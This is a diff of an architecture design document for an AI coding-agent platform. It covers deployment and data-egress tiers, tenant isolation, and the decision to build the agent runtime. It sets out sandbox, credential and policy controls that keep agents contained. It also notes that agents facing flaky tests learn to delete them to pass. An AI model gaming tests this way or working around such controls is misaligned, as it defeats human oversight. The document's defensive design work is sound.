+        loop["agent loop<br/>holds the model key in memory<br/>never in the container"]
+        proxy["egress proxy"]
+        subgraph box["tenant container"]
+            stub["exec stub"]
+            tools["shell, files, LSP, stdio MCP<br/>customer source"]
+        end
+    end
+
+    provider["model provider"]
+    gh["GitHub"]
+
+    cp -->|"instruction, short-lived token"| loop
+    loop -->|"events, steps, diff, verdicts"| cp
+    kms -.->|"Managed and BYOK only"| loop
+    loop <-->|"local socket, one process hop"| stub
+    stub --- tools
+    loop -->|"prompt"| proxy
+    proxy --> provider
+    tools -->|"package installs, stdio MCP"| proxy
+    cp -->|"push, PR — never from the container"| gh
+
+    classDef never stroke-dasharray:4 4
+    class box never
+```
+
+**Self-hosted is the only model where the key never reaches us**, and that is the point of it: the
+customer configures it into their runner and we have no copy to lose. It is also the model where source
+never crosses, which is why the diff is the one thing worth a strict-mode switch — a customer who will
+not let a diff leave gets guard verdicts computed by the runner and reported as facts, and accepts that
+those facts are produced in an environment they control. They are the party being protected, so that
+trade is theirs to make.
+
+#### Data egress is consented, and it has three destinations
+
+"Does anything leave the customer's environment" is not one question. Data leaves toward three
+different parties, and a customer may feel very differently about each:
+
+| Destination | What goes there | Enforced at |
+|---|---|---|
+| **Forge** | events, steps, diffs, verdicts, metrics | the runner, which emits only what the tier allows |
+| **The model provider** | prompts, which contain source | the egress proxy |
+| **Third parties** | package registries, MCP servers, documentation | the egress proxy allowlist |
+
+The second is the one customers underestimate. Even in Self-hosted, where nothing reaches us, the
+prompt reaches Anthropic or OpenAI — that is source leaving their environment, to a party they may
+scrutinise harder than they scrutinise us. It is also the one already covered by machinery we are
+building: the proxy is where provider egress is allowed, denied, or pointed at a customer's own
+endpoint.
+
+**Tiers, not toggles.** Per-item switches multiply into combinations that do not cohere — "no diff, but
+a working review UI" is not a configuration, it is a bug report. Four tiers, each internally
+consistent, each stating what stops working:
+
+| Tier | Leaves toward Forge | What it costs |
+|---|---|---|
+| **Full** | everything, including tool output and prompts | nothing; the default for Managed and BYOK |
+| **Diff only** | diffs, verdicts, metrics, state. Tool output summarised, prompts never | support cannot see why an attempt failed from a stack trace |
+| **Metadata only** | verdicts, metrics, paths, transitions | the review UI shows status rather than content — review moves to the pull request. §14's repository knowledge must be built and kept in the runner, so a workspace's accumulated advantage stops being portable between deployments |
+| **Billing only** | aggregate counts | no central audit trail, and §19 becomes a record of decisions with no evidence attached to them |
+
+**Enforcement is at the runner, and again on receipt.** The runner emits only what its tier permits —
+a tier is not a request the control plane politely honours. The control plane then rejects payloads
+carrying fields the workspace's tier forbids, because a runner is software that can be misconfigured
+or an old version, and defence in depth means not trusting that the other end held.
+
+**Consent is a record, not a setting.** Who agreed, to which tier, at what version of this policy, and
+when — written to `audit_events` (§19) like every other authority change. A tier that tightens takes
+effect immediately; one that loosens applies only to attempts started afterwards, so nothing is
+retroactively disclosed by a configuration change.
+
+**Retention is a second axis, not the same one.** "You may see this" and "you may keep this" are
+different permissions, and a customer will often grant the first and bound the second. Diffs and tool
+output already live in a separate access-controlled store (§17); that store takes a per-workspace
+retention window, independent of tier.
+
+- *Worth telling customers plainly:* if their repositories are on github.com, their source has already
+  left their environment. The coherent requirement is "no source reaches **Forge**", which is what
+  these tiers deliver. Treating it as "no source leaves at all" leads to designing for a threat model
+  the customer is not actually operating under — and only GitHub Enterprise Server changes that, which
+  brings its own inbound-reachability problem for §8's signal triage.
+
+#### What is identical in all three
+
+The control plane: the task lifecycle and its guards (§10), the dependency graph (§12), diff guards
+and effective authority (§17), audit (§19), and the decision that a task is complete. The runner
+executes and reports; it never decides. That invariant is what keeps three deployment models from
+becoming three products.
+
+- *What could go wrong:* the matrix multiplies into per-model code paths. The defence is that the
+  difference between models is **configuration of two things only** — where a credential resolves, and
+  which `SandboxProvider` is bound. Anything that needs a third branch is a design error to be fixed
+  rather than an exception to be added.
+
+### Scoping the execution layer
+
+The unit of isolation is the **workspace**. Everything below is per-workspace unless it says
+otherwise, and where it is not, that is a gap rather than a decision.
+
+| Layer | Scoped by | Mechanism | State |
+|---|---|---|---|
+| Rows | workspace | RLS + `SET LOCAL app.workspace_id`, empty-tenant guard | built |
+| Sandbox network | workspace | `forge-sbx-{workspaceId}`; two tenants' containers cannot address each other | built |
+| Container identity | workspace + sandbox | labels, so an orphan traces to an attempt and a tenant | built |
+| Per-container resources | attempt | `--cpus`, `--memory`, `--pids-limit`, tmpfs size | built |
+| Task claim | task | lease + fencing epoch, one worker per task | built |
+| Egress rules and credentials | workspace | §16's proxy tables | designed |
+| Model spend | workspace | §22 ceilings | designed |
+| **Queue position** | **nothing** | one Redis stream per job *kind*, FIFO across all tenants | **gap** |
+| **Concurrent attempts** | **nothing** | no limit on how many sandboxes one workspace runs at once | **gap** |
+| **Build caches** | **nothing** | not designed, and see below | **gap** |
+
+**Queue fairness.** `streamKey` is `STREAM_PREFIX + kind`, so every tenant shares one FIFO per job
+kind. A workspace that enqueues a thousand tasks puts every other tenant behind them — head-of-line
+blocking with no mechanism to prevent it. The fix that fits the existing design is a per-workspace
+in-flight quota checked before the lease is acquired, with over-quota messages re-queued on the
+backoff the reconciler already implements, rather than partitioned streams and a round-robin consumer.
+
+**Concurrency.** Per-container limits bound one sandbox. Nothing bounds a tenant's total, so one
+workspace can exhaust the worker VM's memory or its container count and degrade every other tenant.
+The quota above is the same control and should be expressed once, in attempts rather than in bytes.
+
+**Caches are a disclosure channel, not only a performance feature.** The workspace table lists warm
+build caches as a capability. A cache shared across tenants is a cross-tenant read: a private npm
+package, an internal Maven artifact, or a source file resolved for one customer sits in a volume the
+next container mounts. **Caches are per-workspace, always**, and the warm-image story is per-workspace
+layers rather than one shared volume. This is the only item in this section that is a confidentiality
+bug rather than a fairness one.
+
+**Intra-tenant reachability is currently open, and should not be.** The network is per *workspace*, so
+two concurrent attempts for the same tenant can address each other's sandboxes. There is no reason
+for them to, and one compromised repository reaching another of the same tenant's builds is a real
+step in an attack chain. The network should be per **attempt**, with the §16 proxy sidecar attached to
+each. *Docker allocates a subnet per network, so measure the ceiling on a worker VM before assuming
+this scales; if it does not, the fallback is per-attempt firewall rules on a shared network, which is
+weaker and should be recorded as such.*
 
 ---
 
@@ -1688,15 +2277,14 @@ Even a well-behaved agent feels dangerous to a customer who cannot see what it i
 
 ## 27. Suggested implementation order
 
-This section assumes the **Appendix B recommendation is adopted**: build the outer loop, buy the inner loop.
+Per Appendix B, the execution runtime is **built** in Java behind `ExecutionHarness`. Phases 0 and 3 below reflect that; the bake-off that would have decided it has been run and is recorded in `decision-log.md`.
 
 **Organising principle: prove the entire mechanical substrate before the first LLM call.** Phases 1–2 contain no model at all. When the agent later misbehaves, you will know it is the prompt — not the queue, the lease, the harness, or the state machine. Teams that wire the LLM in first spend months unable to tell those apart.
 
 **Scheduling note:** Phase 0 is a throwaway spike that depends on nothing. It runs **in parallel with Phase 1**, not before it. Serialising them wastes two weeks, because nothing in Phase 1 is affected by which harness wins.
 
 ```
-   Phase 0  ├── spike: harness bake-off ──┐
-            │                              ▼ decision gates Phase 3
+   Phase 0  ├── (done) harness evaluation ── decided: build
    Phase 1  ├── foundation ── identity ── GitHub App
    Phase 2  │                    └── jobs ── task FSM
    Phase 3  │                              └── harness integration
@@ -1709,19 +2297,20 @@ This section assumes the **Appendix B recommendation is adopted**: build the out
 
 ---
 
-### Phase 0 — Harness bake-off (spike, throwaway, parallel with Phase 1)
+### Phase 0 — Harness evaluation — **done, decided: build**
 
-**Goal:** replace the Appendix B hypothesis with data. This code is deleted afterwards.
+The bake-off's questions were answered by reading the candidates at the source rather than by running
+a spike, and the outcome is Appendix B. The three that decided it:
 
-Per B.8: stand up the OpenHands agent server in Docker and drive it from a throwaway Spring service over REST/WebSocket; do the same for the Claude Agent SDK behind a minimal Python wrapper. Run 20 seeded tasks on one real repository with known failing tests.
+- **Can transition authority stay on the Java side?** Yes, but only by disabling each candidate's own
+  security analyzer, which is model-self-reported and inverts §17.
+- **Does the §16 credential boundary hold?** No — every candidate co-locates the model loop with tool
+  execution, so a provider key sits in the sandbox with customer source.
+- **Is the inner loop expensive to rebuild?** No longer. mini-swe-agent scores >74% on SWE-bench
+  Verified in ~100 lines.
 
-**Exit criteria — a written decision recording:**
-- Resolution rate, cost per resolved task, wall-clock per task, for each harness.
-- Crash-resume correctness: kill the harness mid-task; does it resume, and is the resumed state correct?
-- **Whether transition authority can stay on the Java side** — the harness reports outcomes, Forge decides transitions (§10.3). If this cannot be enforced, that is the signal to build instead of buy.
-- The §16 credential boundary holds: no GitHub token reachable from inside the harness sandbox.
-
-**Not in scope:** production code, our schema, our FSM, multi-tenancy. Resist all of it.
+Full findings, including the OpenHands adapter that was built and what it could not satisfy, are in
+`decision-log.md`.
 
 ---
 
@@ -1757,17 +2346,24 @@ Per B.8: stand up the OpenHands agent server in Docker and drive it from a throw
 
 ---
 
-### Phase 3 — Harness integration *(gated on the Phase 0 decision)*
+### Phase 3 — Execution runtime
 
 **Goal:** Forge can make a real code change in a real repository, driven by a scripted sequence — still no autonomous loop.
 
 | Step | Deliverable | Exit criteria |
 |---|---|---|
-| 3.1 | `ExecutionHarness` port (§B.6): `startAttempt`, `sendGuidance`, `streamEvents`, `pause`, `resume`, `captureDiff`, `destroy`. In-memory fake + conformance suite | Conformance suite green against the fake |
-| 3.2 | Winning-harness adapter, containerised, driven over REST/WebSocket | Conformance suite green against the real adapter |
-| 3.3 | **Credential boundary**: host-brokered clone, no token in the harness sandbox, egress deny-by-default + proxy allowlist, per-workspace network | `docker inspect` shows non-root, cap-dropped, read-only rootfs, no credentials in env or `.git/config` |
-| 3.4 | Harness event stream → our `task_steps` / `tool_calls` / `evidence` rows; sandbox lifecycle table + reaper | A scripted change is fully reconstructable from Postgres; orphaned containers are reaped |
-| 3.5 | Kill-the-container test | Attempt ends `ABORTED` (not `FAILED`), retry budget untouched, cumulative patch replays onto a fresh sandbox |
+| 3.1 | `ExecutionHarness` port: `open`, `run`, `pause`, `captureDiff`, `close`. In-memory fake + conformance suite | **Done** — conformance suite green against the fake |
+| 3.2 | `SandboxProvider` port + Docker adapter, hardened per §16 | **Done** — flags read back off a running container by `docker inspect` |
+| 3.3a | `platform.crypto` envelope encryption — **prerequisite**, credentials cannot be stored without it | A rotatable DEK; installation tokens in Redis stop being plaintext (known-gaps §2) |
+| 3.3b | **Egress proxy + credential boundary**: `--internal` workspace network, dual-homed proxy sidecar, sentinel substitution, per-workspace allowlist, egress audit | A sentinel is what the sandbox holds and the upstream sees the real credential; an unmatched host is refused with readable text; the proxy being down aborts rather than opens; **and the host is proven unreachable from an `--internal` bridge** |
+| 3.4 | **Service dependencies**: contract-declared companion containers on the workspace network | This repository's own Testcontainers suite runs green inside a sandbox — no `docker.sock` anywhere |
+| 3.5 | Native runtime: tool catalogue and dispatch, background processes, in-sandbox git, LSP, MCP adapter | Conformance suite green against the native harness |
+| 3.6 | Harness event stream → `task_steps` / `tool_calls` / `evidence`; sandbox lifecycle table + reaper | A scripted change is fully reconstructable from Postgres; orphaned containers are reaped |
+| 3.7 | Kill-the-container test | Attempt ends `ABORTED` (not `FAILED`), retry budget untouched, cumulative patch replays onto a fresh sandbox |
+
+Ordered so the proxy precedes the runtime, per Appendix E: remote MCP, the model key, `git push`,
+package installs, and warm caches all route through it, so building the catalogue first would mean
+building it twice.
 
 **Not in scope:** planning, escalation, autonomy. The harness is a tool Forge drives, not yet a loop.
 
@@ -1828,16 +2424,6 @@ Per B.8: stand up the OpenHands agent server in Docker and drive it from a throw
 | 8.3 | Dashboards: attempts-to-success, first-try verification pass rate, **human edit rate**, cost per merged PR | The metrics that decide whether this works are visible before the first design partner |
 
 ---
-
-### What "start" means this week
-
-1. `build.gradle`: add Spring Modulith, ArchUnit, Testcontainers. Keep Spring AI — the Java side still needs a `UTILITY` model for signal triage and knowledge consolidation even after buying the harness, though `ModelRouter` becomes smaller than §13 originally implied.
-2. Create the §2 package skeleton with `package-info.java` module descriptors.
-3. `docker-compose.yml` for Postgres + Redis.
-4. Flyway `V1__baseline.sql` with tenancy, identity, audit, and RLS policies.
-5. In parallel, start Phase 0: pull the OpenHands agent server image and get one conversation running against a throwaway repo.
-
-Steps 1–4 are unambiguous and unaffected by every open question. Step 5 is what resolves the remaining ones.
 
 ---
 
@@ -1906,2698 +2492,241 @@ Most of the leverage here is not at the class level. The failure mode this archi
 
 ---
 
-## Appendix B — Build vs. buy: should we build the agent runtime ourselves?
+---
 
-**Status: research findings and recommendation. Not yet applied to §1–§27.** If accepted, §9, §14, §15 and §16 change substantially; §1–§8, §10–§13 and §17–§22 are unaffected.
+## Appendix B — Build vs. buy: the execution runtime
 
-### B.1 This is three decisions, not one
+**We build it, in Java, and keep `ExecutionHarness` as the port.**
 
-The question "build or buy the agent runtime" hides three independent choices at different layers. Conflating them is how teams end up adopting a framework that solves one layer and fighting it on the other two.
+The inner loop is commodity — mini-swe-agent scores >74% on SWE-bench Verified in ~100 lines with a
+single bash tool — so "expensive to rebuild" is not the argument it once was. What decides it is that
+§15–§18 delete most of what buying would supply: every candidate harness co-locates the model loop
+with tool execution, which puts a provider key inside the sandbox; none has multi-tenancy; and their
+risk classification is model-self-reported, which §17 inverts. Adopting one means disabling its loop
+placement, its credential handling, and its security analyzer, then keeping the rest — which is the
+part we would have written anyway.
 
-| Layer | What it does | Candidates |
+The port stays regardless. A native runtime is the first implementation; an OpenHands adapter exists
+as a second and is what proves the abstraction is real rather than decorative.
+
+The reasoning that first recommended buying, and the source-level findings that reversed it, are in
+`decision-log.md`.
+
+---
+
+## Appendix C — The three planes
+
+Every control belongs to exactly one plane, and which one decides everything else about it.
+
+| Plane | Runs | Authored by | Tenant-mutable |
+|---|---|---|---|
+| **Isolation** — container, netns, read-only rootfs, cap-drop, egress proxy | kernel | Forge | no |
+| **Policy** — may this call happen, risk class, diff guards, budget | host, in-process | Forge | within a schema, tighten-only |
+| **Capability** — shell, binaries, tools, MCP servers, processes | inside the sandbox | anyone | freely |
+
+**All flexibility is spent on the capability plane.** That is what makes it affordable: adding a tool
+cannot widen the blast radius, because the blast radius is defined a plane below and never consults
+the tool list.
+
+The governing rule for any new control:
+
+> Does this **contain** a capability, or **remove** it? Removal is acceptable only where containment
+> is genuinely impossible, and that has to be demonstrated rather than assumed.
+
+`docker.sock` is the one true removal — there is no containment story, so it is excluded permanently.
+
+### What the workspace holds
+
+The agent loop is commodity; the environment it runs in is not, and is what compounds.
+
+| | Why it matters |
+|---|---|
+| **Services** | Declared companion containers. Without them the integration tier does not exist |
+| **Toolchain** | Warm images and populated caches. A cold install per attempt is a §22 cost, every attempt, forever. **Hibernation is the missing half:** a workspace that compounds must not bill for idle, and Hermes' Modal and Daytona backends already do wake-on-demand persistence. Whatever substrate Forge lands on needs an answer to this, or the warm workspace becomes the expensive one |
+| **MCP servers** | The error tracker, the issue tracker, the API docs — context no checkout contains |
+| **Verification contract** | Human-declared, tuned over months |
+| **Repo knowledge** (§14) | Architecture notes, conventions, past attempts as evidence, known-flaky tests |
+| **Egress allowlist** | Registries, MCP hosts, documentation |
+| **Credentials** | Present in effect, absent in fact |
+
+A workspace at month six is materially better at its repository than the same workspace on day one.
+That is the differentiator, and it is a capability one. Security is a qualifier: it is what makes a
+team willing to grant write access at all, and the claim worth making from it is **"you can leave it
+running"** rather than any property of the sandbox. §26's metric — human edit rate on Forge PRs — is
+the right one, and it is a product metric.
+
+### Which test scopes gate completion
+
+The criterion is not what can be executed, but what the loop can consume as a control signal:
+deterministic, cheap enough to run many times per attempt, needing neither a human nor a deployment.
+
+| Layer | Gate on it | Why |
 |---|---|---|
-| **L1 — Durable orchestration** | Survive crashes across long-running work; retries, timers, resume | Temporal, Restate, Inngest, Hatchet, DBOS, or our hand-rolled Postgres+Redis |
-| **L2 — Coding-agent harness** | The inner loop: read/edit/run/test in a sandbox, tool dispatch, context compaction | Claude Agent SDK, Claude Managed Agents, OpenHands SDK, SWE-agent, Aider, OpenCode, Codex CLI |
-| **L3 — Generic agent framework** | Graph/DAG orchestration of LLM calls, multi-agent patterns | LangGraph, PydanticAI, OpenAI Agents SDK, Microsoft Agent Framework, CrewAI, AutoGen |
+| **Unit** | yes — the core | Deterministic, fastest, no dependencies |
+| **Integration** | yes — where real defects live | Needs §16's service dependencies |
+| Contract (consumer-driven) | free byproduct | Verifying a stored pact is a file plus your own service |
+| End-to-end | **no** | Flaky, and see below |
+| Acceptance (business requirement) | **never automate** | Human judgment; §9 already assigns it there |
+| Smoke | out of scope | Post-deploy, and Forge does not deploy |
 
-Forge needs L1 and L2. It does **not** need L3 — see B.5.
+**A flaky gate is disqualifying for a reason that does not apply to human developers.** Under a
+nondeterministic signal the agent cannot distinguish "my change broke this" from "this fails
+sometimes", so it thrashes and converges on the one action that reliably turns the signal green:
+deleting the flaky test. Admitting E2E to the gate would manufacture the behaviour §17 exists to
+police, then punish the agent for it. Determinism is a prerequisite for the anti-cheat model to be
+*fair*, not only for results to be trustworthy.
 
-### B.2 The constraint that reshapes everything: we are a Java shop
-
-Every serious coding-agent harness in 2026 is Python or TypeScript. There is no Java option at L2, and there will not be one.
-
-| Candidate | Language | Java? |
-|---|---|---|
-| Claude Agent SDK | Python, TypeScript (spawns a `claude` CLI subprocess) | No |
-| OpenHands Software Agent SDK | Python (Pydantic, FastAPI, LiteLLM) | No — but ships a REST/WebSocket agent server |
-| SWE-agent | Python | No |
-| Aider | Python (single-process, terminal-oriented) | No |
-| OpenCode | TypeScript/Effect, client-server with SQLite | No |
-| OpenAI Agents SDK | Python, JS | No |
-| PydanticAI | Python | No |
-| Microsoft Agent Framework | .NET, Python (1.0 GA April 2026) | No |
-| LangGraph | Python, JS | No |
-| CrewAI / AutoGen | Python (AutoGen merged into MS Agent Framework) | No |
-| **Temporal** | Go, Python, TS, **Java**, .NET | **Yes, first-class** |
-| **Restate** | TS, Python, **Java/Kotlin**, Go, Rust — **Spring Boot starter** | **Yes** |
-| Hatchet | Python, TS, Go, Ruby | No |
-| DBOS | Python, TS | No |
-
-So adopting anything at L2 means **a polyglot service boundary is unavoidable**. That sounds like a cost, but our architecture already has one: §1 defines an execution plane separate from the control plane, and §16 defines a `SandboxProvider` port whose whole purpose is to hide what runs over there. A Python agent server behind that port is not a new architectural concession — it is the concession we already made, cashed in for something valuable.
-
-### B.3 The uncomfortable finding: most of §9/§15/§16 is commodity
-
-> **Which OpenHands this is about.** The project has two architectures, and almost everything written
-> about it describes the wrong one. The original OpenDevin design — `AgentController`, `Runtime`,
-> an agenthub of community agents — is what the team now calls **V0**, and its docs pages are
-> excluded from the current index. Everything below concerns **V1**: a full rewrite living in a
-> separate repository (`OpenHands/software-agent-sdk`), which is what [arXiv:2511.03690](https://arxiv.org/abs/2511.03690)
-> documents. Cite the version, not just the paper — a comparison against V0 would be a comparison
-> against code nobody ships.
->
-> Worth knowing that V1's stated motivation runs *away* from us. It relaxed V0's mandatory
-> sandboxing to opt-in — partly because MCP assumes local access to credentials and files — and
-> co-located execution with the agent loop. Both are correct for a developer running an agent on
-> their own machine, and both are trades §16 and §18 cannot make. **V0 was architecturally closer to
-> ForgeStack than V1 is.**
-
-
-The OpenHands Software Agent SDK paper ([arXiv:2511.03690](https://arxiv.org/abs/2511.03690)) describes an architecture that is close to a line-by-line match for what we designed independently:
-
-| Our design | OpenHands SDK |
-|---|---|
-| §11 append-only steps/tool calls, replay | Event-sourced `ConversationState`, append-only `EventLog`, deterministic replay |
-| §9 checkpoint per step, resume after crash | Auto-detects incomplete sessions, continues from last processed event |
-| §10 pause for human, resume | `conversation.pause()` → `PauseEvent` → `run()` |
-| §16 `SandboxProvider` port, Docker adapter, future remote | `Workspace` abstraction: `LocalWorkspace` / `DockerWorkspace` / `APIRemoteWorkspace`, same agent code unchanged |
-| §15 `ToolDefinition` → dispatch → result → evidence | Action–Execution–Observation with Pydantic-validated Action models |
-| §13 `ModelRouter` with role bindings | `RouterLLM` with `select_llm()`, 100+ providers via LiteLLM |
-| §17 risk classification, approval gate | `SecurityAnalyzer` (LOW/MED/HIGH/UNKNOWN) + `ConfirmationPolicy`, `WAITING_FOR_CONFIRMATION` state |
-| §11 output truncation, §14 context budget | `Condenser` / `LLMSummarizingCondenser`, ~2× cost reduction |
-| §15 MCP-shaped tool definitions | Native MCP integration |
-
-That convergence is worth two conclusions, and they point in opposite directions:
-
-1. **Our design is sound.** Independent teams solving this problem arrive at event sourcing, replay, workspace abstraction, and risk-gated tool dispatch. We did not get it wrong.
-2. **Therefore it is commodity, and building it is not where our time should go.** MIT-licensed, benchmarked at 72.8% on SWE-Bench Verified, hardened over 18 months of production. We would spend M5–M8 rebuilding it and land somewhere worse.
-
-**What is genuinely ours** — and what no harness at L2 provides — is everything the plan describes *outside* the inner loop: the task lifecycle FSM (§10), the dependency graph and runnability (§12), effective authority and diff guards (§17), the verification contract (§9), multi-tenancy and RLS (§18), GitHub App scoping (§7), signal triage (§8), long-term repo knowledge (§14), audit (§19), and cost governance (§22). That is the "continuously maintains it" product. The inner loop is table stakes underneath it.
-
-### B.4 L2 candidates assessed
-
-**Claude Managed Agents** ([docs](https://platform.claude.com/docs/en/managed-agents/overview)) — hosted REST harness; Anthropic runs the loop *and* the sandbox. Sessions are long-running, resume cleanly, support steering/interrupt, and there are scheduled deployments. Self-hosted sandboxes ([docs](https://platform.claude.com/docs/en/managed-agents/self-hosted-sandboxes)) keep tool execution on our infrastructure while orchestration stays with Anthropic.
-- *Fastest path by a wide margin.* No harness, no sandbox, no loop to operate.
-- **Disqualifying for v1:** Managed Agents is **not eligible for Zero Data Retention**, by design — sessions persist conversation history and sandbox state server-side. For a product whose entire job is handling customers' proprietary source code, "we cannot offer ZDR" is an objection we would hit in the first enterprise conversation. Also beta, and Claude-only.
-- *Reconsider* if Anthropic adds ZDR coverage, or for a self-serve tier where customers accept it.
-
-**Claude Agent SDK** ([hosting docs](https://code.claude.com/docs/en/agent-sdk/hosting)) — the harness behind Claude Code, self-hosted. Spawns a `claude` CLI subprocess per session; `SessionStore` adapters (S3/Redis/Postgres) persist transcripts across hosts; OTEL built in; documented multi-tenant isolation (`settingSources: []`, per-tenant `CLAUDE_CONFIG_DIR`, per-tenant `cwd`); hooks and permission gating.
-- *Strongest raw capability*, and the hosting docs are unusually honest about the operational model (subprocess-per-session, ~1 GiB RAM each, memory growth over long sessions, no top-level session timeout).
-- *Cost:* Claude-only, which contradicts our §13 decision to stay provider-agnostic. Library, not a service — we would write and operate a thin Python/TS wrapper.
-
-**OpenHands Software Agent SDK** — MIT, Python, model-agnostic via LiteLLM, ships a REST + WebSocket **agent server** with Docker images, and `APIRemoteWorkspace` for driving it over HTTP.
-- *Best architectural fit.* It already is the execution plane we specified, it is drivable from Java over REST without us writing a wrapper service, and being model-agnostic it preserves §13.
-- *Cost:* smaller ecosystem than Anthropic's; Python operational surface; the paper's comparison table is self-authored and unflatteringly framed toward competitors, so treat its claims about rival SDKs with suspicion (it asserts Claude/OpenAI SDKs "cannot sandbox execution," which the Claude hosting docs plainly contradict).
-
-**SWE-agent / Aider / OpenCode / Codex CLI** — all real and good, none the right shape. SWE-agent is a research harness (small core, YAML tool bundles, SWE-ReX runtime) optimised for benchmarks, not multi-tenant SaaS. Aider is a single-process terminal pair-programmer — its repo-map via tree-sitter is genuinely excellent prior art worth stealing conceptually for §14, but it is not embeddable as a service. OpenCode and Codex CLI are terminal-first products.
-
-### B.5 L1 and L3: what to reject, and why
-
-**Reject L3 entirely.** LangGraph, PydanticAI, OpenAI Agents SDK, Microsoft Agent Framework, CrewAI, AutoGen all solve "orchestrate LLM calls in a graph." We do not have that problem — we have a *domain* state machine (§10) whose states are product concepts with guards, approvals, and audit obligations. Expressing `BLOCKED_ON_DEPENDENCY` as a LangGraph node would be a category error. CrewAI and AutoGen are additionally wrong on substance: role-play multi-agent conversation, with documented production problems around token consumption and error propagation. None have Java support.
-
-**Do not adopt Temporal/Restate/Inngest/Hatchet in v1 — but for a sharper reason than "hand-rolled is fine."**
-
-The decisive point: **a durable execution engine solves durability of execution; it does not solve domain state.** Our §10 FSM is not a durability mechanism — it is product surface. Customers see task states, approvals gate on them, the audit log is built from transitions, and the dependency graph queries them. That must live in Postgres as queryable rows regardless of what orchestrates the work. Temporal would become a *second* source of truth competing with it, which is exactly the objection recorded when this was first decided.
-
-And if we adopt an L2 harness, the inner loop's durability becomes *the harness's* problem — OpenHands' event log and replay, or Claude's `SessionStore`. What is left for us to orchestrate is a handful of coarse, long steps per attempt, which leases + outbox + reconciler (§20, §21) handle comfortably. **Adopting L2 makes the hand-rolled L1 decision safer, not riskier.**
-
-Worth recording for later: Temporal is genuinely proven at this exact workload — OpenAI runs Codex on it, reportedly millions of coding-agent requests daily — and has a first-class Java SDK. **Restate** is the more interesting option for us specifically: single binary, Java/Kotlin SDK, and an official `dev.restate:sdk-spring-boot-starter`. If durability bugs accumulate in M3–M8, Restate is the escape hatch, and it fits a Spring shop better than Temporal does.
-
-### B.6 Recommendation
-
-**Build the outer loop. Buy the inner loop.**
-
-```
-KEEP (this is Forge, and nothing else provides it)
-  Java/Spring control plane · Task FSM §10 · dependency graph §12
-  policy + effective authority + diff guards §17 · verification contract §9
-  multi-tenancy/RLS §18 · GitHub OAuth/App/webhooks §6–§8
-  signals + triage §8 · repo knowledge §14 · audit §19 · cost governance §22
-  hand-rolled orchestration: outbox + Redis Streams + leases + reconciler §5, §20, §21
-
-BUY (commodity, and we would build it worse)
-  inner attempt loop · tool dispatch · context compaction · sandbox lifecycle
-  → OpenHands Software Agent SDK, run as the execution plane,
-    driven from Java over its REST/WebSocket agent server
-
-REJECT
-  L3 agent frameworks (wrong layer, wrong language)
-  Temporal/Restate/Inngest/Hatchet in v1 (domain state ≠ durable execution)
-  Managed Agents in v1 (no ZDR — unacceptable for customer source code)
-```
-
-**Primary: OpenHands SDK**, because it preserves provider-agnosticism (§13), is MIT, and exposes a REST server we can drive from Spring without writing a wrapper.
-**Fallback: Claude Agent SDK** behind the same port, if evaluation shows a decisive quality gap. The port makes this a swap, not a rewrite — and it is the same `SandboxProvider`-style discipline argued in §16.
-
-Concretely, §16's `SandboxProvider` widens into an **`ExecutionHarness` port** (`startAttempt`, `sendGuidance`, `streamEvents`, `pause`, `resume`, `captureDiff`, `destroy`) with an `OpenHandsHarness` adapter and an in-memory fake. The `@Port` justification (§2) writes itself. Everything in §17 stays on the Java side: we do not delegate authority decisions to the harness's `SecurityAnalyzer` — we use it as an *additional* signal and keep our own gate, because the harness's risk rating is a model judgement and §17 requires that the LLM may raise risk but never lower it.
-
-**Revised milestone impact:** M5 and M6 shrink dramatically (integrate and harden a harness rather than build sandbox + tools from scratch); M7 mostly disappears; M8 arrives materially sooner. M4 (FSM), M9 (verification + diff guards), M10 (webhooks), M11 (policy) are unchanged — which is the tell that we are keeping the right half.
-
-### B.7 What could go wrong with this recommendation
-
-1. **We inherit someone else's roadmap and bugs.** Mitigated by the port + conformance suite (§16) and by the fallback adapter being real, not theoretical. Pin versions; do not track `main`.
-2. **The harness's abstractions fight our FSM.** Specifically, it wants to own "when is the task done" and we require that guards decide (§10.3). Rule: the harness reports *outcomes*; Forge decides *transitions*. If that boundary proves unenforceable in evaluation, that is the signal to fall back to building.
-3. **Python operational surface in a Java shop.** Real cost — a second runtime, second dependency ecosystem, second on-call surface. Bounded by running it only as a containerised service behind REST, never as a library we embed.
-4. **Evaluation cost is not zero.** Benchmarks in the paper cost $100–1000 per run. Budget a real spike (below) rather than deciding from documentation, including this one.
-5. **Prompt-injection surface moves but does not shrink.** §16's rule stands unchanged and is now *more* important: no GitHub token inside the harness sandbox, host-brokered git, egress deny-by-default. A third-party harness must not be trusted with credentials we would not give our own sandbox.
-
-### B.8 Proposed next step before committing
-
-A two-week spike, run before M5, against one real repository with a known failing test:
-
-1. Stand up the OpenHands agent server in Docker; drive `POST /conversations` and the event WebSocket from a throwaway Spring service.
-2. Do the same with the Claude Agent SDK behind a minimal Python/FastAPI wrapper.
-3. Measure on 20 seeded tasks: resolution rate, cost per resolved task, wall-clock, crash-resume correctness, and — most important — **whether we can keep transition authority on the Java side** in both.
-4. Verify the §16 credential boundary holds in each.
-
-Decide from that data. Everything above is a hypothesis formed from documentation, and documentation is written by people selling something — including the MIT-licensed ones.
-
-### Sources
-
-- [OpenHands Software Agent SDK (arXiv:2511.03690)](https://arxiv.org/abs/2511.03690) · [HTML](https://arxiv.org/html/2511.03690v1) · [docs](https://docs.openhands.dev/sdk) · [agent server source](https://github.com/OpenHands/software-agent-sdk/tree/main/openhands-agent-server/openhands/agent_server)
-- [Claude Agent SDK — hosting](https://code.claude.com/docs/en/agent-sdk/hosting) · [overview](https://platform.claude.com/docs/en/agent-sdk/overview)
-- [Claude Managed Agents — overview](https://platform.claude.com/docs/en/managed-agents/overview) · [self-hosted sandboxes](https://platform.claude.com/docs/en/managed-agents/self-hosted-sandboxes)
-- [SWE-agent: Agent-Computer Interfaces (arXiv:2405.15793)](https://arxiv.org/abs/2405.15793) · [Inside the Scaffold: taxonomy of coding agent architectures (arXiv:2604.03515)](https://arxiv.org/pdf/2604.03515)
-- [Aider repo map](https://aider.chat/docs/repomap.html) · [OpenCode agent system](https://deepwiki.com/sst/opencode/3.2-agent-system)
-- [Temporal + OpenAI Agents SDK](https://temporal.io/blog/announcing-openai-agents-sdk-integration) · [Temporal Replay 2026 announcements](https://temporal.io/blog/replay-2026-product-announcements)
-- [Restate Java SDK](https://www.restate.dev/blog/announcing-the-restate-java-sdk) · [Spring Boot starter](https://central.sonatype.com/artifact/dev.restate/sdk-spring-boot-starter)
